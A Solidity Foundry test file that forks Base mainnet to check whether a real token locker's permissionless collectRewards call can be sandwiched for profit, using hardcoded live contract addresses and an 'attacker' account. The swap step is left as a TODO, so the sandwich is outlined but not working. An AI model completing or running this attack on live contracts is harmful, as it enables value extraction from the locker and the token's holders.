// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

interface IWETH {
    function balanceOf(address) external view returns (uint256);
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface ILocker {
    function collectRewards(address token) external;
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

/// @notice Test: can we profitably sandwich a collectRewards call?
contract FeeSnipeTest is Test {
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant CREAO = 0x59D916075b3F4DCd4121E4AD2Fb79fF7E8677b07;
    address constant CREAO_LOCKER = 0x63D2DfEA64b3433F4071A98665bcD7Ca14d93496;
    address constant PM = 0x498581fF718922c3f8e6A244956aF099B2652b2b;

    address attacker;

    function setUp() public {
        // Fork Base mainnet
        attacker = makeAddr("attacker");
        deal(attacker, 1 ether);
        deal(WETH, attacker, 10 ether);
    }

    function test_collectRewardsIsPermissionless() public {
        // Anyone can call collectRewards
        vm.prank(attacker);
        try ILocker(CREAO_LOCKER).collectRewards(CREAO) {
            emit log("collectRewards: SUCCESS - permissionless confirmed");
        } catch {
            emit log("collectRewards: REVERTED - may need pool context");
        }
    }

    function test_wethBalanceBeforeAfterCollect() public {
        // Check WETH flow during collectRewards
        uint256 lockerWethBefore = IWETH(WETH).balanceOf(CREAO_LOCKER);
        uint256 creaoBalBefore = IERC20(CREAO).balanceOf(CREAO_LOCKER);

        emit log_named_uint("Locker WETH before", lockerWethBefore);
        emit log_named_uint("Locker CREAO before", creaoBalBefore);

        vm.prank(attacker);
        try ILocker(CREAO_LOCKER).collectRewards(CREAO) {} catch {}

        uint256 lockerWethAfter = IWETH(WETH).balanceOf(CREAO_LOCKER);
        uint256 creaoBalAfter = IERC20(CREAO).balanceOf(CREAO_LOCKER);

        emit log_named_uint("Locker WETH after", lockerWethAfter);
        emit log_named_uint("Locker CREAO after", creaoBalAfter);

        emit log_named_int("WETH delta", int256(lockerWethAfter) - int256(lockerWethBefore));
        emit log_named_int("CREAO delta", int256(creaoBalAfter) - int256(creaoBalBefore));
    }

    function test_sandwichProfit() public {
        // Full sandwich simulation:
        // 1. Attacker swaps WETH -> CREAO (moves price)
        // 2. collectRewards triggers zero-slippage fee conversion
        // 3. Attacker swaps CREAO -> WETH (captures spread)

        uint256 attackerWethBefore = IWETH(WETH).balanceOf(attacker);
        emit log_named_uint("Attacker WETH before", attackerWethBefore);

        // Step 1: Swap WETH -> CREAO via Universal Router or direct PM
        // For now just test if collectRewards changes any state
        vm.startPrank(attacker);

        // Approve
        IWETH(WETH).approve(PM, type(uint256).max);

        // TODO: Execute swap through PM.unlock
        // This requires implementing IUnlockCallback

        vm.stopPrank();

        // Step 2: collectRewards
        vm.prank(attacker);
        try ILocker(CREAO_LOCKER).collectRewards(CREAO) {
            emit log("Fee collection triggered");
        } catch {
            emit log("Fee collection failed");
        }

        uint256 attackerWethAfter = IWETH(WETH).balanceOf(attacker);
        emit log_named_uint("Attacker WETH after", attackerWethAfter);

        if (attackerWethAfter > attackerWethBefore) {
            emit log_named_uint("PROFIT", attackerWethAfter - attackerWethBefore);
        }
    }
}
